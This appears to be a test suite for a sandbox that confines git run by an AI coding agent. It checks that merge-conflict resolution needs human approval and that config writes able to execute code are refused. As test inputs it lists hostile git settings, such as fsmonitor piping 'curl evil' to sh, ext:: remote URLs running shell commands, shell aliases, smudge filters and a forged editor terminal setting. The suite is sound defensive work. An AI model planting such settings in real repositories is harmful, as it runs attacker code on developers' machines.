// Live tests of what the contained git may write beyond a clean checkout:
// a merge conflict in an exec-config file (git's own merge output is
// reported "conflicted", and only an approved write resolves it), the
// repository's .git/config (plain settings pass; anything that makes git
// run or load something is refused), and checkouts with end-of-line
// conversion (accepted as git checks them out; a filter driver on agent
// config is refused by name). Real namespaces; local files only.

import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { executionCapable, plainUrl } from "./git-config-check.js";
import { containmentSupport, type ContainmentEvent } from "./host.js";
import {
  FIXTURES,
  fakeHome,
  planContext,
  refusals,
  runContainedScript,
  startContainedServer,
  tempTree,
} from "./test-helpers.js";

const live = containmentSupport().ok;

const GIT_ENV = {
  ...process.env,
  GIT_CONFIG_NOSYSTEM: "1",
  GIT_CONFIG_GLOBAL: "/dev/null",
  GIT_AUTHOR_NAME: "t",
  GIT_AUTHOR_EMAIL: "t@example.test",
  GIT_COMMITTER_NAME: "t",
  GIT_COMMITTER_EMAIL: "t@example.test",
};
const git = (cwd: string, ...args: string[]) =>
  execFileSync("git", args, { cwd, env: GIT_ENV, encoding: "utf8" });
const IDENT = {
  GIT_AUTHOR_NAME: "c",
  GIT_AUTHOR_EMAIL: "c@example.test",
  GIT_COMMITTER_NAME: "c",
  GIT_COMMITTER_EMAIL: "c@example.test",
};

type Changed = {
  path: string;
  state: string;
  sha256: string | null;
  added?: Array<{ key: string; value: string }>;
};
const changedOf = (events: readonly ContainmentEvent[]) =>
  events
    .filter((e) => (e as { code?: unknown }).code === "containment-repo-config-changed")
    .flatMap((e) => (e as unknown as { paths: Changed[] }).paths);

async function until(f: () => boolean, ms = 5000) {
  const end = Date.now() + ms;
  while (!f() && Date.now() < end) {
    await new Promise((r) => setTimeout(r, 20));
  }
}

/** Two branches that change .vscode/settings.json differently. */
function conflictRepo(dir: string) {
  fs.mkdirSync(path.join(dir, ".vscode"), { recursive: true });
  git(dir, "init", "-q", "-b", "main");
  fs.writeFileSync(path.join(dir, ".vscode", "settings.json"), '{\n  "a": 1\n}\n');
  git(dir, "add", "-A");
  git(dir, "commit", "-q", "-m", "base");
  git(dir, "checkout", "-q", "-b", "theirs");
  fs.writeFileSync(path.join(dir, ".vscode", "settings.json"), '{\n  "a": 2\n}\n');
  git(dir, "commit", "-q", "-am", "theirs");
  git(dir, "checkout", "-q", "main");
  fs.writeFileSync(path.join(dir, ".vscode", "settings.json"), '{\n  "a": 3\n}\n');
  git(dir, "commit", "-q", "-am", "ours");
}

describe("git config check (pure)", () => {
  it("passes plain settings and refuses every execution-capable one", () => {
    const e = (key: string, value: string) => executionCapable({ key, value });
    for (const [k, v] of [
      ["remote.origin.url", "https://example.test/r.git"],
      ["remote.origin.url", "git@example.test:r.git"],
      ["remote.origin.fetch", "+refs/heads/*:refs/remotes/origin/*"],
      ["branch.main.remote", "origin"],
      ["branch.main.merge", "refs/heads/main"],
      ["user.name", "x"],
      ["core.autocrlf", "input"],
      ["alias.st", "status"],
      ["pager.log", "false"],
      ["fetch.bundleuri", "https://example.test/bundles"],
      ["submodule.lib.url", "https://example.test/lib.git"],
      ["promisor.acceptfromserver", "none"],
      ["http.sslverify", "true"],
    ]) {
      expect([k, v, e(k, v)]).toEqual([k, v, null]);
    }
    for (const [k, v] of [
      ["core.fsmonitor", "curl evil|sh"],
      ["core.hookspath", "/tmp/h"],
      ["core.sshcommand", "sh -c x"],
      ["core.pager", "sh"],
      ["core.editor", "sh"],
      ["diff.evil.textconv", "sh"],
      ["filter.lfs.smudge", "x"],
      ["filter.x.process", "x"],
      ["diff.x.command", "x"],
      ["merge.x.driver", "x"],
      ["alias.pwn", "!sh -c x"],
      ["credential.helper", "!x"],
      ["credential.https://e.test.helper", "x"],
      ["include.path", "/tmp/c"],
      ["includeIf.gitdir:/x/.path", "/tmp/c"],
      ["url.ext::sh -c x.insteadof", "https://github.com/"],
      ["protocol.allow", "always"],
      ["protocol.ext.allow", "always"],
      ["remote.origin.uploadpack", "sh -c x"],
      ["remote.origin.url", "ext::sh -c touch% /tmp/x"],
      ["remote.origin.url", "evilhelper://x"],
      ["http.proxy", "http://p"],
      ["http.https://x.proxy", "http://p"],
      ["sequence.editor", "sh"],
      ["gpg.program", "sh"],
      ["ssh.variant", "simple"],
      ["submodule.x.update", "!sh"],
      ["hook.pre-commit.command", "sh"],
      ["pager.log", "sh -c x"],
      ["core.worktree", "/elsewhere"],
      // Added after reviewing git v2.53.0's sources:
      ["gc.recentObjectsHook", "sh -c x"],
      ["gc.repackFilterTo", "/tmp/packs"],
      ["imap.tunnel", "sh -c x"],
      ["receive.procReceiveRefs", "refs/for"],
      ["promisor.acceptFromServer", "all"],
      ["fetch.bundleURI", "ext::sh -c x"],
      ["bundle.b1.uri", "ext::sh -c x"],
      ["submodule.x.url", "ext::sh -c x"],
      ["help.browser", "sh"],
      ["help.htmlPath", "/tmp/x"],
      ["man.viewer", "sh"],
      ["diff.orderFile", "/etc/passwd"],
      ["blame.ignoreRevsFile", "/tmp/x"],
      ["mailmap.file", "/tmp/x"],
      ["format.signatureFile", "/tmp/x"],
      ["http.cookieFile", "/tmp/x"],
      ["http.https://e.test.sslCert", "/tmp/x"],
      ["http.proxySSLKey", "/tmp/x"],
      ["gpg.ssh.revocationFile", "/tmp/x"],
      ["gpg.ssh.defaultKeyCommand", "sh -c x"],
      ["gpg.ssh.allowedSignersFile", "/tmp/x"],
      ["fsmonitor.socketDir", "/tmp/x"],
      ["sendemail.headerCmd", "sh"],
      ["sendemail.sendmailCmd", "sh"],
      ["sendemail.smtpSSLCertPath", "/tmp/x"],
      ["instaweb.httpd", "sh"],
      ["instaweb.modulePath", "/tmp/x"],
      ["svn.authorsProg", "sh"],
      ["svn-remote.svn.authorsProg", "sh"],
    ].map(([k, v]) => [
      k.replace(/^([^.]+)\.(.*)$/, (_m, a: string, b: string) => `${a.toLowerCase()}.${b}`),
      v,
    ])) {
      expect([k, e(k, v)]).toEqual([k, expect.any(String)]);
    }
    expect(plainUrl("file:///srv/r.git")).toBe(true);
    expect(plainUrl("fd::17")).toBe(false);
  });
});

describe.skipIf(!live)(
  "containment: what the contained git writes besides a clean checkout",
  () => {
    let root: string;
    let home: string;
    let stateDir: string;
    beforeAll(() => {
      root = tempTree("contain-gitw");
      home = fakeHome(root);
      stateDir = path.join(root, "state");
    });
    afterAll(() => {
      fs.rmSync(root, { recursive: true, force: true });
    });

    it("a merge conflict in an exec-config file is git's own output: reported 'conflicted'; only an approved write resolves it", async () => {
      const dir = path.join(root, "conflict");
      conflictRepo(dir);
      const file = path.join(dir, ".vscode", "settings.json");
      const srv = await startContainedServer(
        { name: "ops", command: "node", args: [path.join(FIXTURES, "ops-server.cjs")] },
        {
          roots: [{ path: dir, access: "rw" }],
          packageRoot: FIXTURES,
          programs: ["git"],
          cwd: dir,
        },
        planContext(home),
        { stateDir },
      );
      try {
        const m = JSON.parse(
          (await srv.call("exec", { cmd: "git", args: ["merge", "theirs"], cwd: dir, env: IDENT }))
            .text,
        );
        expect(m.status).toBe(1); // a conflict, as git reports it
        await until(() => changedOf(srv.events).some((c) => c.state === "conflicted"));
        expect(changedOf(srv.events)).toEqual([
          expect.objectContaining({ path: file, state: "conflicted" }),
        ]);
        expect(fs.readFileSync(file, "utf8")).toMatch(/^<<<<<<< HEAD$/m);
        expect(srv.child.exitCode).toBeNull();
        // The agent cannot resolve it on its own...
        const resolved = '{\n  "a": 23\n}\n';
        const w1 = JSON.parse(
          (await srv.call("fs_ops", { ops: [{ op: "write", path: file, content: resolved }] }))
            .text,
        );
        expect(Object.values(w1)).toEqual(["EACCES"]);
        // ...only through a write the session approved (a person decided).
        expect(() => srv.containment.approveRepoConfigWrite(path.join(dir, ".mcp.json"))).toThrow(
          /not a conflicted/,
        );
        srv.containment.approveRepoConfigWrite(file);
        const w2 = JSON.parse(
          (await srv.call("fs_ops", { ops: [{ op: "write", path: file, content: resolved }] }))
            .text,
        );
        expect(Object.values(w2)).toEqual(["OK"]);
        await until(() => changedOf(srv.events).some((c) => c.state === "resolved"));
        // The approval ends with that write.
        await new Promise((r) => setTimeout(r, 100));
        const w3 = JSON.parse(
          (await srv.call("fs_ops", { ops: [{ op: "write", path: file, content: "{}" }] })).text,
        );
        expect(Object.values(w3)).toEqual(["EACCES"]);
        const add = JSON.parse(
          (await srv.call("exec", { cmd: "git", args: ["add", ".vscode/settings.json"], cwd: dir }))
            .text,
        );
        expect(add.status).toBe(0);
      } finally {
        await srv.close();
      }
      expect(fs.readFileSync(file, "utf8")).toBe('{\n  "a": 23\n}\n');
      const r = changedOf(srv.events).find((c) => c.state === "resolved");
      expect(r).toMatchObject({ path: file });
      expect(refusals(srv.events)).toEqual([]);
    });

    it("attack: git rewriting a conflicted exec-config file with anything but its merge is refused", async () => {
      const dir = path.join(root, "conflict-forged");
      conflictRepo(dir);
      const file = path.join(dir, ".vscode", "settings.json");
      // Conflict first (host), then a contained git apply that adds a payload to the conflicted file.
      try {
        git(dir, "merge", "theirs");
      } catch {
        /* the conflict */
      }
      const forged = fs
        .readFileSync(file, "utf8")
        .replace("=======", '  "terminal.integrated.shell.linux": "/tmp/x",\n=======');
      fs.writeFileSync(path.join(dir, "x"), forged);
      // `git diff --no-index` exits 1 when the files differ: read its output anyway.
      const patch = spawnSync("git", ["diff", "--no-index", "--", ".vscode/settings.json", "x"], {
        cwd: dir,
        env: GIT_ENV,
        encoding: "utf8",
      })
        .stdout.replace(/b\/x/g, "b/.vscode/settings.json")
        .replace(/^index .*\n/m, "");
      fs.rmSync(path.join(dir, "x"));
      fs.writeFileSync(path.join(dir, "p.patch"), patch);
      const r = await runContainedScript(
        {
          label: "git apply",
          projectDir: dir,
          command: "git",
          args: ["apply", "p.patch"],
          programs: ["git"],
        },
        planContext(home),
        { stateDir },
      );
      expect(r.code, `${r.stdout}\n${r.stderr}`).toBe(125);
      expect(refusals(r.events).map((x) => x.code)).toEqual(["containment-repo-config-refused"]);
      expect(JSON.stringify(r.events)).toContain("not git's merge");
      expect(fs.existsSync(file) ? fs.readFileSync(file, "utf8") : "").not.toContain("/tmp/x");
    }, 60_000);

    it("git config, git remote add and upstream tracking save .git/config inside; plain settings are reported", async () => {
      const dir = path.join(root, "cfg-legit");
      fs.mkdirSync(dir);
      git(dir, "init", "-q", "-b", "main");
      fs.writeFileSync(path.join(dir, "README.md"), "x\n");
      git(dir, "add", "-A");
      git(dir, "commit", "-q", "-m", "init");
      const r = await runContainedScript(
        {
          label: "git config",
          projectDir: dir,
          command: "sh",
          args: [
            "-c",
            "git config user.email c@example.test && git remote add origin https://example.test/r.git && git config branch.main.remote origin && git config branch.main.merge refs/heads/main",
          ],
          programs: ["git"],
        },
        planContext(home),
        { stateDir },
      );
      expect(r.code, `${r.stdout}\n${r.stderr}`).toBe(0);
      expect(refusals(r.events)).toEqual([]);
      expect(git(dir, "config", "remote.origin.url").trim()).toBe("https://example.test/r.git");
      expect(git(dir, "config", "branch.main.remote").trim()).toBe("origin");
      const keys = changedOf(r.events)
        .filter((c) => c.state === "git-config")
        .flatMap((c) => (c.added ?? []).map((a) => a.key));
      expect(keys).toEqual(
        expect.arrayContaining(["user.email", "remote.origin.url", "branch.main.remote"]),
      );
    });

    it("attack: a config write that makes git run something is quarantined, the config restored and the run stopped", async () => {
      for (const cmd of [
        "git config core.fsmonitor 'curl evil | sh'",
        "git remote add evil 'ext::sh -c touch% /tmp/pwned'",
        "git config alias.st '!sh -c \"curl evil\"'",
        "git config filter.evil.smudge 'sh -c x'",
      ]) {
        const dir = path.join(root, `cfg-evil-${cmd.split(" ")[1]}-${cmd.length}`);
        fs.mkdirSync(dir);
        git(dir, "init", "-q", "-b", "main");
        const before = fs.readFileSync(path.join(dir, ".git", "config"), "utf8");
        const r = await runContainedScript(
          {
            label: "git config",
            projectDir: dir,
            command: "sh",
            args: ["-c", cmd],
            programs: ["git"],
          },
          planContext(home),
          { stateDir },
        );
        expect([cmd, r.code]).toEqual([cmd, 125]);
        expect([cmd, refusals(r.events).map((x) => x.code)]).toEqual([
          cmd,
          ["containment-repo-config-refused"],
        ]);
        expect([cmd, fs.readFileSync(path.join(dir, ".git", "config"), "utf8")]).toEqual([
          cmd,
          before,
        ]);
      }
      // A program that is not git still cannot touch .git/config at all.
      const dir = path.join(root, "cfg-nongit");
      fs.mkdirSync(dir);
      git(dir, "init", "-q", "-b", "main");
      const r = await runContainedScript(
        {
          label: "echo",
          projectDir: dir,
          command: "sh",
          args: ["-c", "echo '[core] fsmonitor = x' >> .git/config"],
          programs: ["git"],
        },
        planContext(home),
        { stateDir },
      );
      expect(r.code).not.toBe(0);
      expect(fs.readFileSync(path.join(dir, ".git", "config"), "utf8")).not.toContain("fsmonitor");
      // Nor the per-worktree config git reads when extensions.worktreeConfig is set.
      const wt = await runContainedScript(
        {
          label: "echo",
          projectDir: dir,
          command: "sh",
          args: ["-c", "printf '[core]\\n\\tfsmonitor = x\\n' > .git/config.worktree"],
          programs: ["git"],
        },
        planContext(home),
        { stateDir },
      );
      expect(wt.code).not.toBe(0);
      expect(fs.existsSync(path.join(dir, ".git", "config.worktree"))).toBe(false);
    }, 120_000);

    it("end-of-line conversion is accepted as git checks the file out; a filter driver on agent config is refused by name", async () => {
      const dir = path.join(root, "eol");
      fs.mkdirSync(dir);
      git(dir, "init", "-q", "-b", "main");
      fs.writeFileSync(
        path.join(dir, ".gitattributes"),
        "*.json text eol=crlf\n.mcp.json filter=evil\n",
      );
      fs.writeFileSync(path.join(dir, "README.md"), "x\n");
      git(dir, "add", "-A");
      git(dir, "commit", "-q", "-m", "init");
      git(dir, "checkout", "-q", "-b", "cfg");
      fs.mkdirSync(path.join(dir, ".vscode"));
      fs.writeFileSync(path.join(dir, ".vscode", "settings.json"), '{\n  "a": 1\n}\n');
      git(dir, "add", "-A");
      git(dir, "commit", "-q", "-m", "editor");
      git(dir, "checkout", "-q", "-b", "mcp");
      fs.writeFileSync(path.join(dir, ".mcp.json"), '{"mcpServers":{}}\n');
      git(dir, "add", "-A");
      git(dir, "commit", "-q", "-m", "mcp");
      git(dir, "checkout", "-q", "main");
      const ok = await runContainedScript(
        {
          label: "git checkout",
          projectDir: dir,
          command: "git",
          args: ["checkout", "-q", "cfg"],
          programs: ["git"],
        },
        planContext(home),
        { stateDir },
      );
      expect(ok.code, `${ok.stdout}\n${ok.stderr}`).toBe(0);
      expect(fs.readFileSync(path.join(dir, ".vscode", "settings.json"), "utf8")).toBe(
        '{\r\n  "a": 1\r\n}\r\n',
      );
      expect(changedOf(ok.events)).toEqual([expect.objectContaining({ state: "checked-out" })]);
      expect(refusals(ok.events)).toEqual([]);
      const bad = await runContainedScript(
        {
          label: "git checkout",
          projectDir: dir,
          command: "git",
          args: ["checkout", "-q", "mcp"],
          programs: ["git"],
        },
        planContext(home),
        { stateDir },
      );
      expect(bad.code).toBe(125);
      expect(
        refusals(bad.events)
          .map((x) => x.message)
          .join("\n"),
      ).toMatch(/a filter driver \("evil"\) applies to \.mcp\.json/);
      expect(fs.existsSync(path.join(dir, ".mcp.json"))).toBe(false);
    }, 60_000);
  },
);
